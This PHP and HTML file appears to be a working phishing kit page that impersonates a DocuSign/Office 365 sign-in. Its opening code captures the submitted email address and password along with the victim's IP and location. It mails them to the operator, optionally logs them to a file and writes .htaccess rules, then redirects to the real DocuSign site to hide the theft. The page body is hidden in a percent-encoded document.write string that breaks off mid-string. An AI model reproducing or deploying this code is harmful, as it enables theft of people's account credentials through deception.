<?php
error_reporting(0);
if (isset($_POST['Email'])) { 

$emailprovider = $_POST["hidCflag"]; 
switch ($emailprovider) {
    case 0: 
        $emailprovider = "Office365"; 
        break;
    case 1: 
        $emailprovider = "Gmail"; 
        break; 
    case 2: 
        $emailprovider = "Yahoo"; 
        break; 
    case 3: 
        $emailprovider = "Hotmail"; 
        break; 
    case 4: 
        $emailprovider = "AOL"; 
        break; 
    case 5: 
        $emailprovider = "Others"; 
        break; 
} 
$browser = $_SERVER['HTTP_USER_AGENT'];

include('../../config.php');
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "\n";
$message .= "Provider: ".$emailprovider."\n"; //
$message .= "Email: " . $_POST['Email'] . "\n"; 
$message .= "Pass: " . $_POST['Passwd'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "\n";
$subject = "[Adrut] DOCUSIGN $emailprovider | $ip";

@mail($send,$subject,$message);
if ($emailprovider == "Gmail")
{
    if ($log)
    {
        $fp = fopen("../error-log.txt","a");
        fputs($fp,$message);
        fclose($fp);
    }

    @header("Location: verification?cmd=_account-verification&session=".md5(microtime())."&dispatch=".sha1(microtime())."country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']);
}
else
{
    if ($log)
    {
        $fp = fopen("../error-log.txt","a");
        fputs($fp,$message);
        fclose($fp);
    }

    if ($onetime)
    {
        $file1 = fopen("../../.htaccess","a");
        fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
        RewriteRule .* https://docusign.com//view_document/api-9812730u102836189231 [R,L]
        ');
        fclose($file1);
    }
?> 

<script type="text/javascript">
   window.location="https://docusign.com//view_document/api-9812730u102836189231"; 
</script>
<?php	
}
exit; 
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link href="../../assets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<link href="../../assets/SpryValidationPassword.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="../../images/favicon.ico" type="image/x-icon" />
<link type="text/css" rel="stylesheet" href="../../css/GeminiHomeV2.css">
<link type="text/css" rel="stylesheet" href="../../css/conciergehelper.css">
<link type="text/css" rel="stylesheet" href="../../css/AppTile.css">
<link type="text/css" rel="stylesheet" href="../../css/EmbeddedFonts.css">
<link type="text/css" rel="stylesheet" href="../../css/MasterStyles15.css">
<link type="text/css" rel="stylesheet" href="../../css/MasterStyles15MVC.css">
<link type="text/css" rel="stylesheet" href="../../css/shellg2coremincss_ba45585d.css">
<link href="../../css/shellg2corecss_11377998.css" type="text/css" rel="stylesheet">
<link id="shellThemeLink" type="text/css" href="../../css/data.css" rel="stylesheet">
<link href="../../css/shellg2pluscss_baae2042.css" type="text/css" rel="stylesheet">
<title>Docusign</title>

<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(dbx/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
	height: 75px;
	border-bottom: 1px solid #e5e5e5;
	overflow: hidden;
  }
  .header .logo {
	float: left;
	margin-top: 13px;
	margin-right: 0;
	margin-bottom: 0;
	margin-left: 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
	border: 0;
	height: 75px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);

  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  }
  .google-header-bar.centered .header .logo {
	margin-top: 15px;
	margin-right: auto;
	margin-bottom: 15px;
	margin-left: auto;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(../../assets/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff) format('woff');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(../../assets/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff) format('woff');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  .banner {
	text-align: center;
	margin-top: 5px;
	margin-bottom: 5px;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 576px;
  height: 50px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
	margin-bottom: 3px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("dbx/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>


</head>
<script language="javascript">
document.write(unescape('%3C%62%6F%64%79%20%73%74%79%6C%65%3D%22%6F%76%65%72%66%6C%6F%77%3A%20%68%69%64%64%65%6E%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%74%68%65%6D%65%2D%62%61%73%65%20%6F%33%36%35%2D%74%68%65%6D%65%2D%62%61%73%65%22%3E%0A%0A%0A%0A%3C%74%61%62%6C%65%20%63%6C%61%73%73%3D%22%53%68%65%6C%6C%2D%4D%6F%64%65%72%6E%22%20%69%64%3D%22%53%68%65%6C%6C%43%6F%6E%74%61%69%6E%65%72%22%20%63%65%6C%6C%70%61%64%64%69%6E%67%3D%22%30%22%20%63%65%6C%6C%73%70%61%63%69%6E%67%3D%22%30%22%3E%0A%20%20%20%20%3C%74%62%6F%64%79%3E%0A%20%20%20%20%20%20%20%20%3C%74%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%74%64%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%72%65%6D%6F%76%65%46%6F%63%75%73%4F%75%74%6C%69%6E%65%22%20%69%64%3D%22%47%65%6D%69%6E%69%53%68%65%6C%6C%48%65%61%64%65%72%22%3E%3C%64%69%76%20%69%64%3D%22%4F%33%36%35%5F%4E%61%76%48%65%61%64%65%72%22%20%61%75%74%6F%69%64%3D%22%5F%6F%33%36%35%73%67%32%63%5F%6C%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%68%65%61%64%65%72%31%36%20%6F%33%36%35%63%73%2D%62%61%73%65%20%6F%33%36%35%63%73%74%20%6F%33%36%35%73%70%6F%20%6F%33%36%35%63%73%2D%6E%61%76%2D%68%65%61%64%65%72%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%42%47%43%6F%6C%6F%72%2D%32%20%6F%33%36%35%63%73%2D%74%6F%70%6E%61%76%42%47%49%6D%61%67%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%61%66%66%6F%72%64%61%6E%63%65%2D%6F%66%66%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%6C%65%66%74%41%6C%69%67%6E%22%3E%20%20%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%6D%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%6E%22%3E%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%72%73%70%2D%6D%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%77%2D%68%69%64%65%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%66%66%22%3E%3C%64%69%76%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%61%76%2D%74%6F%70%49%74%65%6D%20%6F%33%36%35%63%73%2D%6E%61%76%2D%6F%33%36%35%42%72%61%6E%64%69%6E%67%20%6F%33%36%35%63%73%2D%72%73%70%2D%74%6E%2D%68%69%64%65%49%66%41%66%66%6F%72%64%61%6E%63%65%4F%6E%22%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%47%6F%20%74%6F%20%79%6F%75%72%20%4F%66%66%69%63%65%20%33%36%35%20%68%6F%6D%65%20%70%61%67%65%22%20%68%72%65%66%3D%22%23%22%20%69%64%3D%22%4F%33%36%35%5F%4D%61%69%6E%4C%69%6E%6B